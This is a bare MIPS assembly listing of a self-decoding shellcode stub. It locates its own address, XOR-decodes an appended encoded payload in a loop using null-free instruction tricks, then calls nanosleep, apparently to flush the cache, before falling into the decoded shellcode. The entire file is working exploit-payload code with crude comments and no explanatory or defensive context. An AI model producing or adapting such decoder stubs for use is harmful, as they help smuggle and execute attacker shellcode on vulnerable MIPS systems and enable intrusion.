.set noat
.set noreorder

li $t6, 0xfffffffb   # 4 passes
nor $t6, $t6, $zero    # put number of passes in $t6
li $t3,-93    # addend to calculated PC is ???
xor  $t0,$t6,$t6
addi $t0,$t0,-1
next:
  bltzal  $t0, next
  slti    $t0, $zero, 0x8282
  addi    $sp,$ra,-30
  nor     $t3, $t3, $zero    # addend in $9
  addu  $t9, $ra, $t3   # $t9 points to encoded shellcode +4
  slti  $s7, $zero, 0x8282   # store 0 in $s7 (our counter)
  lw  $s1, -4($t9)    # load xor key in $s1
  li $t4, -5
  nor $t4, $t4, $zero    # 4 in $t4
  addi  $t7, $t4, -3    # 1 in $t7
  
loop:
  lw  $t0, -4($t9)
  addu  $s7, $s7, $t7   # increment counter
  xor $v1, $t0, $s1
  sltu  $s8, $s7, $t6   # enough loops?
  sw  $v1, -4($t9)
  bne $zero, $s8, loop
  addu  $t9, $t9, $t4   # next instruction to decode :)

  addi  $a2, $t4, -3   # 1 in $a2 (for req.sec)
  sw  $a2,-8($sp)
  xor $a1,$t6,$t6  #zero in $a1 (NULL for timespec *rem, 0 for req.nsec))
  sw  $a1,-4($sp)      #$a1 (0)  in req.nsec
  addiu $a0,$sp,-8     #timespec *req in $a0

  li  $v0, 4166               # nanosleep, fucker
  syscall 0x52950

  nop       # encoded shellcoded must be here (xor key right here #)
# $t9 (aka $t9) points here


